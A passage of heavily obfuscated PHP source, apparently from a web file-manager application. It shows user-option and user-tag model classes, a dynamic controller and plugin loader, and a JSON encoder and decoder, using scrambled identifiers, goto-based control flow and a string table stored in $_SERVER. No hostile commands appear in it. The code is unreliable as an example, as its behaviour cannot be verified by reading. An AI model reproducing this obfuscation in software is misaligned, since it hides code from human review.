Model($F¡Äª¸¬‹[747])->order($F¡Äª¸¬‹[2191])->field($c‹âèâ¥ÂÅ)->where($a”Ì‡Ê­ç‚)->select(); $Aƒ Ç±½ºğ = array_to_keyvalue($Aƒ Ç±½ºğ, $F¡Äª¸¬‹[469]); $Aƒ Ç±½ºğ = array_remove_key($Aƒ Ç±½ºğ, $F¡Äª¸¬‹[469]); goto Dô‘ñÙ¾; Dô‘ñÙ¾: foreach ($b†Ø§‚‚ì as &$B©Íóö†ì) { $B©Íóö†ì[$F¡Äª¸¬‹[402]] = $Aƒ Ç±½ºğ[$B©Íóö†ì[$F¡Äª¸¬‹[1427]]] ? $Aƒ Ç±½ºğ[$B©Íóö†ì[$F¡Äª¸¬‹[1427]]] : array(); } goto bŸô¶Îˆ¡; dÈ°¦¼™ÖŸ: $F¡Äª¸¬‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a”Ì‡Ê­ç‚ = array($F¡Äª¸¬‹[474] => 0, $F¡Äª¸¬‹[382] => SourceModel::TYPE_USER, $F¡Äª¸¬‹[469] => array($F¡Äª¸¬‹[17], $C‹Âº‹ßĞÚ)); $c‹âèâ¥ÂÅ = $F¡Äª¸¬‹[2190]; goto E»×’´¤ñŸ; bŸô¶Îˆ¡: } private function _listAppendGroup(&$EÕÑ†ù±, $A¬…¨Ë¨æ„) { goto D¶³„£ë´ª; bƒÓ™˜¯: $cÀ‰íˆßóÖ = array_to_keyvalue($Dë«šĞÈßª, $eã«¨ ß™…[43], $eã«¨ ß™…[2098]); $cÀ‰íˆßóÖ = array_remove_value(array_unique($cÀ‰íˆßóÖ), $eã«¨ ß™…[481]); if (!$cÀ‰íˆßóÖ || !$Dë«šĞÈßª) { return; } goto F¥©×Ó°; F¥©×Ó°: $Eí´Ô™ŸÕ = array($eã«¨ ß™…[2098] => array($eã«¨ ß™…[17], $cÀ‰íˆßóÖ)); $D…‘æİÈ = Model($eã«¨ ß™…[2543])->field($eã«¨ ß™…[2544])->where($Eí´Ô™ŸÕ)->select(); $D…‘æİÈ = array_to_keyvalue($D…‘æİÈ, $eã«¨ ß™…[2098]); goto F°£µØ®™; F°£µØ®™: $Dë«šĞÈßª = array_to_keyvalue_group($Dë«šĞÈßª, $eã«¨ ß™…[1427]); foreach ($Dë«šĞÈßª as &$D’Ïƒë¤Œ) { $FĞ”Æ­†åÖ = array(); foreach ($D’Ïƒë¤Œ as $eöáÃÎÎÃ÷) { if (!$eöáÃÎÎÃ÷[$eã«¨ ß™…[2242]]) { continue; } $E¯á‡îˆËî = Model($eã«¨ ß™…[2261])->listData($eöáÃÎÎÃ÷[$eã«¨ ß™…[2242]]); $FĞ”Æ­†åÖ[] = array($eã«¨ ß™…[2098] => $eöáÃÎÎÃ÷[$eã«¨ ß™…[2098]], $eã«¨ ß™…[2545] => $D…‘æİÈ[$eöáÃÎÎÃ÷[$eã«¨ ß™…[2098]]][$eã«¨ ß™…[38]], $eã«¨ ß™…[472] => $D…‘æİÈ[$eöáÃÎÎÃ÷[$eã«¨ ß™…[2098]]][$eã«¨ ß™…[472]], $eã«¨ ß™…[387] => $E¯á‡îˆËî); } $D’Ïƒë¤Œ = $FĞ”Æ­†åÖ; } foreach ($EÕÑ†ù± as &$AÚŠ…Øİ–ó) { $AÚŠ…Øİ–ó[$eã«¨ ß™…[2541]] = array(); if (isset($Dë«šĞÈßª[$AÚŠ…Øİ–ó[$eã«¨ ß™…[1427]]])) { $AÚŠ…Øİ–ó[$eã«¨ ß™…[2541]] = $Dë«šĞÈßª[$AÚŠ…Øİ–ó[$eã«¨ ß™…[1427]]]; } } goto D¤ºæÏ´ô; D¶³„£ë´ª: $eã«¨ ß™… =& $_SERVER[¹÷ˆ§éÒ°ú]; $Eí´Ô™ŸÕ = array($eã«¨ ß™…[1427] => array($eã«¨ ß™…[17], $A¬…¨Ë¨æ„)); $Dë«šĞÈßª = Model($eã«¨ ß™…[2177])->where($Eí´Ô™ŸÕ)->select(); goto bƒÓ™˜¯; D¤ºæÏ´ô: } private function _listAppendMeta(&$e“ª ÄĞ, $CÓˆ…¥êï²) { goto E÷‡˜Îõ‰; E÷‡˜Îõ‰: $E¿§©Ù·µÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d­¼”ºÇºÆ = UserJobModel::JOB_KEY; $CííÁ¸‘öÈ = array($E¿§©Ù·µÈ[2523]); goto A²©¯ê“œğ; fÔÑÔµù¦î: foreach ($E”›àÌ³ as &$a¦ïšÕ¾Úõ) { $BºƒÒ¾½Ş° = array(); foreach ($a¦ïšÕ¾Úõ as $aĞ—´ÑÓŞ) { if (!in_array($aĞ—´ÑÓŞ[$E¿§©Ù·µÈ[101]], $CííÁ¸‘öÈ)) { $BºƒÒ¾½Ş°[$aĞ—´ÑÓŞ[$E¿§©Ù·µÈ[101]]] = $aĞ—´ÑÓŞ[$E¿§©Ù·µÈ[370]]; } } $a¦ïšÕ¾Úõ = $BºƒÒ¾½Ş°; } $bæĞÈ×ŞËË = Model($E¿§©Ù·µÈ[2546]); foreach ($e“ª ÄĞ as &$AÀáÎö“Â‹) { $B´¥ˆÃÊÇ = array(); if (isset($E”›àÌ³[$AÀáÎö“Â‹[$E¿§©Ù·µÈ[1427]]])) { $B´¥ˆÃÊÇ = $E”›àÌ³[$AÀáÎö“Â‹[$E¿§©Ù·µÈ[1427]]]; } $AÀáÎö“Â‹[$E¿§©Ù·µÈ[2547]] = array(); if (isset($B´¥ˆÃÊÇ[$d­¼”ºÇºÆ])) { $AÀáÎö“Â‹[$E¿§©Ù·µÈ[2547]] = $bæĞÈ×ŞËË->getUserJobInfo($B´¥ˆÃÊÇ[$d­¼”ºÇºÆ]); } } goto AÉêø‘ÖÛ¶; A²©¯ê“œğ: $EáØñ‹†Ë¦ = array($E¿§©Ù·µÈ[1427] => array($E¿§©Ù·µÈ[17], $CÓˆ…¥êï²)); $E”›àÌ³ = Model($E¿§©Ù·µÈ[2520])->where($EáØñ‹†Ë¦)->select(); $E”›àÌ³ = array_to_keyvalue_group($E”›àÌ³, $E¿§©Ù·µÈ[1427]); goto fÔÑÔµù¦î; AÉêø‘ÖÛ¶: } protected function groupUserAll($e²¡¬ö‰Ã…) { $fŸéâ–‹¡Ú =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$e²¡¬ö‰Ã…) { return !1; } $c’óÃï‘í = Model($fŸéâ–‹¡Ú[2177])->field($fŸéâ–‹¡Ú[1427])->where(array($fŸéâ–‹¡Ú[2098] => array($fŸéâ–‹¡Ú[17], $e²¡¬ö‰Ã…)))->select(); $c’óÃï‘í = array_to_keyvalue($c’óÃï‘í, $fŸéâ–‹¡Ú[43], $fŸéâ–‹¡Ú[1427]); return array_unique($c’óÃï‘í); } public function userSearch($E¤§ÂÈ‚ , $F´İé…” = "\x2a") { return Model($_SERVER[¹÷ˆ§éÒ°ú][490])->where($E¤§ÂÈ‚ )->field($F´İé…”)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A¸ã„•–±Ê) { $a˜Ò®‡™Ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!defined($a˜Ò®‡™Ñ[438])) { define($a˜Ò®‡™Ñ[438], 0); } return "\125\163\145\x72\117\x70\x74\151\157\156\137{$A¸ã„•–±Ê}\x5f" . USER_ID; } protected function filterWhere($B”«éÕ·) { $c®’åÒ–Ôò =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!defined($c®’åÒ–Ôò[438])) { define($c®’åÒ–Ôò[438], 0); } $B”«éÕ·[$c®’åÒ–Ôò[1427]] = USER_ID; return $B”«éÕ·; } public function cacheRemoveUser($Bé´Ü“ò©Î, $c ®ºÁí˜½) { return Cache::remove("\125\x73\x65\x72\x4f\160\164\x69\157\156\137{$Bé´Ü“ò©Î}\x5f" . $c ®ºÁí˜½); } protected function optionDefault($Bµ†ù­”İŞ = '') { $AÍ¦ôôµÆª =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($Bµ†ù­”İŞ == $AÍ¦ôôµÆª[43]) { return $GLOBALS[$AÍ¦ôôµÆª[16]][$AÍ¦ôôµÆª[2548]]; } if ($Bµ†ù­”İŞ == $AÍ¦ôôµÆª[2549]) { return $GLOBALS[$AÍ¦ôôµÆª[16]][$AÍ¦ôôµÆª[2550]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\56\164\141\147\114\x69\x73\164"; public $modelType = "\125\163\145\x72\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x73\164\171\x6c\145", "\163\157\162\x74"); public function listData($dôÌ‡ó¾«¾ = false, $DŒÅïŠ‘ÌŠ = "\x73\157\x72\164", $aÈŸà¥®íà = false) { return parent::listData($dôÌ‡ó¾«¾, $DŒÅïŠ‘ÌŠ, $aÈŸà¥®íà); } public function remove($CÔÔÈŸ´Éš) { return parent::remove($CÔÔÈŸ´Éš); } public function add($d§ß»¾œ Ş, $BñÍÙ­’ — = "\x6c\x61\142\x65\x6c\55\x67\162\x65\x79\x2d\x6e\x6f\x72\155\x61\x6c") { $eÔ¥¯±« =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->findByName($d§ß»¾œ Ş)) { return !1; } $f­Ïè¥Ê‰Š = array($eÔ¥¯±«[397] => $d§ß»¾œ Ş, $eÔ¥¯±«[448] => $BñÍÙ­’ —, $eÔ¥¯±«[2102] => $this->getSort($eÔ¥¯±«[257]) + 1); return parent::insert($f­Ïè¥Ê‰Š); } public function update($aô·êÖíÛ, $d—óÀ¶ÂÊŞ) { $eŸùàâ¡ìô =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÈ¢àÑß²ß = $this->listData($aô·êÖíÛ); $e©ÕÜ¢†èä = $this->findByName($d—óÀ¶ÂÊŞ[$eŸùàâ¡ìô[38]]); if (!$AÈ¢àÑß²ß || $e©ÕÜ¢†èä && $e©ÕÜ¢†èä[$eŸùàâ¡ìô[378]] != $AÈ¢àÑß²ß[$eŸùàâ¡ìô[378]]) { return !1; } return parent::update($aô·êÖíÛ, $d—óÀ¶ÂÊŞ); } public function moveTop($E©œ‡™İ†à) { $A³àğØçÌÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d ƒ«¾À“Ù = parent::listData(); $FÙ¬»¬‰²„ = $this->getSort($A³àğØçÌÏ[256]); foreach ($d ƒ«¾À“Ù as &$C‡‡¿ğÖÍË) { if ($C‡‡¿ğÖÍË[$A³àğØçÌÏ[378]] == $E©œ‡™İ†à) { $C‡‡¿ğÖÍË[$A³àğØçÌÏ[2119]] = $FÙ¬»¬‰²„; continue; } $C‡‡¿ğÖÍË[$A³àğØçÌÏ[2119]] += 1; } return parent::resetData($d ƒ«¾À“Ù); } public function moveBottom($cºÜÇÆå³ë) { $c¼¥…çİ¯ò =& $_SERVER[¹÷ˆ§éÒ°ú]; $dµØ£ñåÈ­ = $this->getSort($c¼¥…çİ¯ò[257]) + 1; return parent::update($cºÜÇÆå³ë, array($c¼¥…çİ¯ò[2119] => $dµØ£ñåÈ­)); } public function resetSort($F‘äÜ†µ×®) { goto d¼Á”²õ‹Ÿ; d¼Á”²õ‹Ÿ: $d¼÷ÃÒ°À† =& $_SERVER[¹÷ˆ§éÒ°ú]; $E®ö‡ÑƒƒÚ = array(); $F‘äÜ†µ×® = is_array($F‘äÜ†µ×®) ? $F‘äÜ†µ×® : array(); goto f½äÍ”ˆƒ; AáŠ…İ¬ÜÉ: return parent::resetData($BØ¼×‚ëã); goto Döõ¼†Ëª; f½äÍ”ˆƒ: for ($A³õëòË²¨ = 0; $A³õëòË²¨ < count($F‘äÜ†µ×®); $A³õëòË²¨++) { $E®ö‡ÑƒƒÚ[$F‘äÜ†µ×®[$A³õëòË²¨] . $d¼÷ÃÒ°À†[43]] = $A³õëòË²¨ + 1; } $BØ¼×‚ëã = parent::listData(); foreach ($BØ¼×‚ëã as &$e„ÖŸ§Ò¸à) { $Añî´‘«‡ß = $E®ö‡ÑƒƒÚ[$e„ÖŸ§Ò¸à[$d¼÷ÃÒ°À†[378]]]; $e„ÖŸ§Ò¸à[$d¼÷ÃÒ°À†[2119]] = $Añî´‘«‡ß ? $Añî´‘«‡ß : $e„ÖŸ§Ò¸à[$d¼÷ÃÒ°À†[2119]]; } goto AáŠ…İ¬ÜÉ; Döõ¼†Ëª: } private function getSort($DòƒÇĞÖ–) { $F¡®“§ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a¼µÆƒŒã’ = parent::listData(); $fÎ±‰ÓóÁœ = array_to_keyvalue($a¼µÆƒŒã’, $F¡®“§[43], $F¡®“§[2119]); if (!$fÎ±‰ÓóÁœ) { $fÎ±‰ÓóÁœ = array(0); } $A¹ĞÔÉÚ’¯ = $DòƒÇĞÖ– == $F¡®“§[257] ? max($fÎ±‰ÓóÁœ) : min($fÎ±‰ÓóÁœ); return intval($A¹ĞÔÉÚ’¯); } } goto B¯ÖïíÚ´; b‘ÛíÇ¯å: function Action($Dò´¥ÚÑƒ = '') { goto aöºÓ»ˆ; aöºÓ»ˆ: $AµÄ­¸©÷ =& $_SERVER[Œá²]; static $FÙá­‘¥ì“ = array(); $CßÌ¯Ù÷ˆ = $Dò´¥ÚÑƒ; goto E¤®¯ˆªá; F†›¿óæá: $eÑêÑ¦·½ = strtolower($E÷¹¾Èï±[0]); if (substr($eÑêÑ¦·½, -6) == $AµÄ­¸©÷[6]) { $Dò´¥ÚÑƒ = substr($E÷¹¾Èï±[0], 0, -6); $eœÚ–ë™®Ø = $Dò´¥ÚÑƒ . $AµÄ­¸©÷[7]; $B‡ôÇˆØ§ = $AµÄ­¸©÷[8]; if (isset($E÷¹¾Èï±[1]) && substr(strtolower($E÷¹¾Èï±[1]), -5) == $AµÄ­¸©÷[9]) { $eœÚ–ë™®Ø = $Dò´¥ÚÑƒ . $E÷¹¾Èï±[1]; $B‡ôÇˆØ§ = $AµÄ­¸©÷[10] . $E÷¹¾Èï±[1] . $AµÄ­¸©÷[11]; } else { if (count($E÷¹¾Èï±) == 3) { $eœÚ–ë™®Ø = $Dò´¥ÚÑƒ . $E÷¹¾Èï±[1] . $E÷¹¾Èï±[2]; $B‡ôÇˆØ§ = $AµÄ­¸©÷[12] . $E÷¹¾Èï±[1] . $AµÄ­¸©÷[13] . $E÷¹¾Èï±[2] . $AµÄ­¸©÷[11]; } } $B‡ôÇˆØ§ = PLUGIN_DIR . $Dò´¥ÚÑƒ . $AµÄ­¸©÷[4] . $B‡ôÇˆØ§; } else { if (substr($eÑêÑ¦·½, -5) == $AµÄ­¸©÷[9]) { $Dò´¥ÚÑƒ = substr($E÷¹¾Èï±[0], 0, -5); return Model($Dò´¥ÚÑƒ); } else { $eœÚ–ë™®Ø = $E÷¹¾Èï±[0] . $E÷¹¾Èï±[1]; $B‡ôÇˆØ§ = CONTROLLER_DIR . $E÷¹¾Èï±[0] . $AµÄ­¸©÷[4] . $E÷¹¾Èï±[1] . $AµÄ­¸©÷[14]; } } $bóÏ˜ßÑØ¢ = strtolower($eœÚ–ë™®Ø); goto b˜¤¥”§Ÿ; BÌœÅÄÕ†ƒ: $FÙá­‘¥ì“[$bóÏ˜ßÑØ¢] = new $eœÚ–ë™®Ø(); $FÙá­‘¥ì“[$CßÌ¯Ù÷ˆ] = $FÙá­‘¥ì“[$bóÏ˜ßÑØ¢]; return $FÙá­‘¥ì“[$bóÏ˜ßÑØ¢]; goto c§ÕĞÜäÏ¶; E¤®¯ˆªá: if (isset($FÙá­‘¥ì“[$CßÌ¯Ù÷ˆ])) { return $FÙá­‘¥ì“[$CßÌ¯Ù÷ˆ]; } $Dò´¥ÚÑƒ = trim(str_replace($AµÄ­¸©÷[4], $AµÄ­¸©÷[5], $Dò´¥ÚÑƒ), $AµÄ­¸©÷[4]); $E÷¹¾Èï± = explode($AµÄ­¸©÷[5], $Dò´¥ÚÑƒ); goto F†›¿óæá; b˜¤¥”§Ÿ: if (isset($FÙá­‘¥ì“[$bóÏ˜ßÑØ¢])) { return $FÙá­‘¥ì“[$bóÏ˜ßÑØ¢]; } if (is_file($B‡ôÇˆØ§)) { include_once $B‡ôÇˆØ§; } if (!class_exists($eœÚ–ë™®Ø)) { return actionCallError("\x5b{$Dò´¥ÚÑƒ}\x20\x3d\x3e\40{$eœÚ–ë™®Ø}\135\40\x63\154\x61\163\163\40\x6e\157\x74\40\x65\170\151\163\164\163\41"); } goto BÌœÅÄÕ†ƒ; c§ÕĞÜäÏ¶: } function ActionApply($d éù”òµ´, $cÍëéÓ±Ş© = array()) { goto B·Ğš¼šÂ’; cˆ±¬ì»ª¶: $b‹×Ò÷¯² = substr($d éù”òµ´, 0, $d¬Ï…ÒÍ); $Eõ‰µÉ²‘Î = substr($d éù”òµ´, $d¬Ï…ÒÍ + 1); $f–Ì¨ÅÆ…‡ = Action($b‹×Ò÷¯²); goto b’ˆÔïàÃ; B·Ğš¼šÂ’: if (is_array($d éù”òµ´)) { return call_user_func_array($d éù”òµ´, $cÍëéÓ±Ş©); } if (function_exists($d éù”òµ´)) { return call_user_func_array($d éù”òµ´, $cÍëéÓ±Ş©); } $d¬Ï…ÒÍ = strrpos($d éù”òµ´, $_SERVER[Œá²][5]); goto cˆ±¬ì»ª¶; b’ˆÔïàÃ: if (!method_exists($f–Ì¨ÅÆ…‡, $Eõ‰µÉ²‘Î)) { return actionCallError("{$d éù”òµ´}\40\155\145\164\x68\157\144\x20\156\x6f\164\x20\x65\x78\x69\163\164\x73\41"); } $d•‰¹¤‡½‘ = call_user_func_array(array($f–Ì¨ÅÆ…‡, $Eõ‰µÉ²‘Î), $cÍëéÓ±Ş©); return $d•‰¹¤‡½‘; goto bëö†¬™Å; bëö†¬™Å: } function actionCallError($dê£œ¸‡Ù) { return write_log($dê£œ¸‡Ù, $_SERVER[Œá²][15]); } goto BÆÒ¹‹Ì­ù; a·”­«Ù°í: define($_SERVER[¹÷ˆ§éÒ°ú][1931], 32); class Services_JSON { function __construct($A‹«ë®îˆ³ = 0) { $this->use = $A‹«ë®îˆ³; } function utf162utf8($Eˆöä±ƒá) { $A£ê“­ÒõÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (function_exists($A£ê“­ÒõÚ[80])) { return mb_convert_encoding($Eˆöä±ƒá, $A£ê“­ÒõÚ[1580], $A£ê“­ÒõÚ[1932]); } $a“ ãœŞò¤ = ord($Eˆöä±ƒá[0]) << 8 | ord($Eˆöä±ƒá[1]); switch (!0) { case (127 & $a“ ãœŞò¤) == $a“ ãœŞò¤: return chr(127 & $a“ ãœŞò¤); case (2047 & $a“ ãœŞò¤) == $a“ ãœŞò¤: return chr(192 | $a“ ãœŞò¤ >> 6 & 31) . chr(128 | $a“ ãœŞò¤ & 63); case (65535 & $a“ ãœŞò¤) == $a“ ãœŞò¤: return chr(224 | $a“ ãœŞò¤ >> 12 & 15) . chr(128 | $a“ ãœŞò¤ >> 6 & 63) . chr(128 | $a“ ãœŞò¤ & 63); } return $A£ê“­ÒõÚ[43]; } function utf82utf16($bŸƒĞ»·—) { $F¨÷‹ÓÍ¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (function_exists($F¨÷‹ÓÍ¨[80])) { return mb_convert_encoding($bŸƒĞ»·—, $F¨÷‹ÓÍ¨[1932], $F¨÷‹ÓÍ¨[1580]); } switch (strlen($bŸƒĞ»·—)) { case 1: return $bŸƒĞ»·—; case 2: return chr(7 & ord($bŸƒĞ»·—[0]) >> 2) . chr(192 & ord($bŸƒĞ»·—[0]) << 6 | 63 & ord($bŸƒĞ»·—[1])); case 3: return chr(240 & ord($bŸƒĞ»·—[0]) << 4 | 15 & ord($bŸƒĞ»·—[1]) >> 2) . chr(192 & ord($bŸƒĞ»·—[1]) << 6 | 127 & ord($bŸƒĞ»·—[2])); } return $F¨÷‹ÓÍ¨[43]; } function encode($B¥©¤á˜·) { $dî¶•ˆê‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; switch (gettype($B¥©¤á˜·)) { case $dî¶•ˆê‹[1591]: return $B¥©¤á˜· ? $dî¶•ˆê‹[1590] : $dî¶•ˆê‹[1592]; case $dî¶•ˆê‹[1933]: return $dî¶•ˆê‹[111]; case $dî¶•ˆê‹[314]: return (int) $B¥©¤á˜·; case $dî¶•ˆê‹[289]: case $dî¶•ˆê‹[288]: return (double) $B¥©¤á˜·; case $dî¶•ˆê‹[323]: $eƒ°æè¼’¼ = $dî¶•ˆê‹[43]; $E¬ë¬øç£÷ = strlen($B¥©¤á˜·); for ($Cà„Ô«Ğõ¶ = 0; $Cà„Ô«Ğõ¶ < $E¬ë¬øç£÷; ++$Cà„Ô«Ğõ¶) { $f±ç ½ÖíÅ = ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶]); switch (!0) { case $f±ç ½ÖíÅ == 8: $eƒ°æè¼’¼ .= $dî¶•ˆê‹[1934]; break; case $f±ç ½ÖíÅ == 9: $eƒ°æè¼’¼ .= $dî¶•ˆê‹[1567]; break; case $f±ç ½ÖíÅ == 10: $eƒ°æè¼’¼ .= $dî¶•ˆê‹[1565]; break; case $f±ç ½ÖíÅ == 12: $eƒ°æè¼’¼ .= $dî¶•ˆê‹[1935]; break; case $f±ç ½ÖíÅ == 13: $eƒ°æè¼’¼ .= $dî¶•ˆê‹[1566]; break; case $f±ç ½ÖíÅ == 34: case $f±ç ½ÖíÅ == 47: case $f±ç ½ÖíÅ == 92: $eƒ°æè¼’¼ .= $dî¶•ˆê‹[105] . $B¥©¤á˜·[$Cà„Ô«Ğõ¶]; break; case $f±ç ½ÖíÅ >= 32 && $f±ç ½ÖíÅ <= 127: $eƒ°æè¼’¼ .= $B¥©¤á˜·[$Cà„Ô«Ğõ¶]; break; case ($f±ç ½ÖíÅ & 224) == 192: $b®­¶”ùÓ¢ = pack($dî¶•ˆê‹[1936], $f±ç ½ÖíÅ, ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 1])); $Cà„Ô«Ğõ¶ += 1; $AÆÅÌÜ—ÖÆ = $this->utf82utf16($b®­¶”ùÓ¢); $eƒ°æè¼’¼ .= sprintf($dî¶•ˆê‹[1937], bin2hex($AÆÅÌÜ—ÖÆ)); break; case ($f±ç ½ÖíÅ & 240) == 224: $b®­¶”ùÓ¢ = pack($dî¶•ˆê‹[1936], $f±ç ½ÖíÅ, ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 1]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 2])); $Cà„Ô«Ğõ¶ += 2; $AÆÅÌÜ—ÖÆ = $this->utf82utf16($b®­¶”ùÓ¢); $eƒ°æè¼’¼ .= sprintf($dî¶•ˆê‹[1937], bin2hex($AÆÅÌÜ—ÖÆ)); break; case ($f±ç ½ÖíÅ & 248) == 240: $b®­¶”ùÓ¢ = pack($dî¶•ˆê‹[1936], $f±ç ½ÖíÅ, ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 1]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 2]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 3])); $Cà„Ô«Ğõ¶ += 3; $AÆÅÌÜ—ÖÆ = $this->utf82utf16($b®­¶”ùÓ¢); $eƒ°æè¼’¼ .= sprintf($dî¶•ˆê‹[1937], bin2hex($AÆÅÌÜ—ÖÆ)); break; case ($f±ç ½ÖíÅ & 252) == 248: $b®­¶”ùÓ¢ = pack($dî¶•ˆê‹[1936], $f±ç ½ÖíÅ, ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 1]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 2]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 3]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 4])); $Cà„Ô«Ğõ¶ += 4; $AÆÅÌÜ—ÖÆ = $this->utf82utf16($b®­¶”ùÓ¢); $eƒ°æè¼’¼ .= sprintf($dî¶•ˆê‹[1937], bin2hex($AÆÅÌÜ—ÖÆ)); break; case ($f±ç ½ÖíÅ & 254) == 252: $b®­¶”ùÓ¢ = pack($dî¶•ˆê‹[1936], $f±ç ½ÖíÅ, ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 1]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 2]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 3]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 4]), ord($B¥©¤á˜·[$Cà„Ô«Ğõ¶ + 5])); $Cà„Ô«Ğõ¶ += 5; $AÆÅÌÜ—ÖÆ = $this->utf82utf16($b®­¶”ùÓ¢); $eƒ°æè¼’¼ .= sprintf($dî¶•ˆê‹[1937], bin2hex($AÆÅÌÜ—ÖÆ)); break; } } return $dî¶•ˆê‹[125] . $eƒ°æè¼’¼ . $dî¶•ˆê‹[125]; case $dî¶•ˆê‹[1938]: if (is_array($B¥©¤á˜·) && count($B¥©¤á˜·) && array_keys($B¥©¤á˜·) !== range(0, sizeof($B¥©¤á˜·) - 1)) { $Bãõ·—÷¯ = array_map(array($this, $dî¶•ˆê‹[1939]), array_keys($B¥©¤á˜·), array_values($B¥©¤á˜·)); foreach ($Bãõ·—÷¯ as $bÅá®¡ò·Ä) { if (Services_JSON::isError($bÅá®¡ò·Ä)) { return $bÅá®¡ò·Ä; } } return $dî¶•ˆê‹[1059] . join($dî¶•ˆê‹[57], $Bãõ·—÷¯) . $dî¶•ˆê‹[326]; } $cßğ£¤‹ØÙ = array_map(array($this, $dî¶•ˆê‹[1940]), $B¥©¤á˜·); foreach ($cßğ£¤‹ØÙ as $c¾æ¾¯£¬) { if (Services_JSON::isError($c¾æ¾¯£¬)) { return $c¾æ¾¯£¬; } } return $dî¶•ˆê‹[169] . join($dî¶•ˆê‹[57], $cßğ£¤‹ØÙ) . $dî¶•ˆê‹[489]; case $dî¶•ˆê‹[1941]: $fğÚÃêƒÆ¤ = get_object_vars($B¥©¤á˜·); $Bãõ·—÷¯ = array_map(array($this, $dî¶•ˆê‹[1939]), array_keys($fğÚÃêƒÆ¤), array_values($fğÚÃêƒÆ¤)); foreach ($Bãõ·—÷¯ as $bÅá®¡ò·Ä) { if (Services_JSON::isError($bÅá®¡ò·Ä)) { return $bÅá®¡ò·Ä; } } return $dî¶•ˆê‹[1059] . join($dî¶•ˆê‹[57], $Bãõ·—÷¯) . $dî¶•ˆê‹[326]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dî¶•ˆê‹[111] : new Services_JSON_Error(gettype($B¥©¤á˜·) . $dî¶•ˆê‹[1942]); } } function name_value($c„÷¸µÜ†…, $f¨…¤‚ÒŠŠ) { $a…¯†«õ¬ = $this->encode($f¨…¤‚ÒŠŠ); if (Services_JSON::isError($a…¯†«õ¬)) { return $a…¯†«õ¬; } return $this->encode(strval($c„÷¸µÜ†…)) . $_SERVER[¹÷ˆ§éÒ°ú][14] . $a…¯†«õ¬; } function reduce_string($e„ëˆÆÂ‹) { $B§å²ö¿Ó =& $_SERVER[¹÷ˆ§éÒ°ú]; $e„ëˆÆÂ‹ = preg_replace(array($B§å²ö¿Ó[1943], $B§å²ö¿Ó[1944], $B§å²ö¿Ó[1945]), $B§å²ö¿Ó[43], $e„ëˆÆÂ‹); return trim($e„ëˆÆÂ‹); } function decode($c••—¨•Ò) { $eĞí£¹Šš… =& $_SERVER[¹÷ˆ§éÒ°ú]; $c••—¨•Ò = $this->reduce_string($c••—¨•Ò); switch (strtolower($c••—¨•Ò)) { case $eĞí£¹Šš…[1590]: return !0; case $eĞí£¹Šš…[1592]: return !1; case $eĞí£¹Šš…[111]: return null; default: $BÓ ĞÈÓƒ“ = array(); if (is_numeric($c••—¨•Ò)) { return (double) $c••—¨•Ò == (int) $c••—¨•Ò ? (int) $c••—¨•Ò : (double) $c••—¨•Ò; } elseif (preg_match($eĞí£¹Šš…[1946], $c••—¨•Ò, $BÓ ĞÈÓƒ“) && $BÓ ĞÈÓƒ“[1] == $BÓ ĞÈÓƒ“[2]) { $Cæ†Ïğä™† = substr($c••—¨•Ò, 0, 1); $C£×„…öò = substr($c••—¨•Ò, 1, -1); $d¯êåì‘ÒØ = $eĞí£¹Šš…[43]; $eùÒ½êÜË = strlen($C£×„…öò); for ($c·¾Â¿šïà = 0; $c·¾Â¿šïà < $eùÒ½êÜË; ++$c·¾Â¿šïà) { $c«¦ÖêºÆ = substr($C£×„…öò, $c·¾Â¿šïà, 2); $Då„¯ÚÂôµ = ord($C£×„…öò[$c·¾Â¿šïà]); switch (!0) { case $c«¦ÖêºÆ == $eĞí£¹Šš…[1934]: $d¯êåì‘ÒØ .= chr(8); ++$c·¾Â¿šïà; break; case $c«¦ÖêºÆ == $eĞí£¹Šš…[1567]: $d¯êåì‘ÒØ .= chr(9); ++$c·¾Â¿šïà; break; case $c«¦ÖêºÆ == $eĞí£¹Šš…[1565]: $d¯êåì‘ÒØ .= chr(10); ++$c·¾Â¿šïà; break; case $c«¦ÖêºÆ == $eĞí£¹Šš…[1935]: $d¯êåì‘ÒØ .= chr(12); ++$c·¾Â¿šïà; break; case $c«¦ÖêºÆ == $eĞí£¹Šš…[1566]: $d¯êåì‘ÒØ .= chr(13); ++$c·¾Â¿šïà; break; case $c«¦ÖêºÆ == $eĞí£¹Šš…[1346]: case $c«¦ÖêºÆ == $eĞí£¹Šš…[1947]: case $c«¦ÖêºÆ == $eĞí£¹Šš…[1560]: case $c«¦ÖêºÆ == $eĞí£¹Šš…[1562]: if ($Cæ†Ïğä™† == $eĞí£¹Šš…[125] && $c«¦ÖêºÆ != 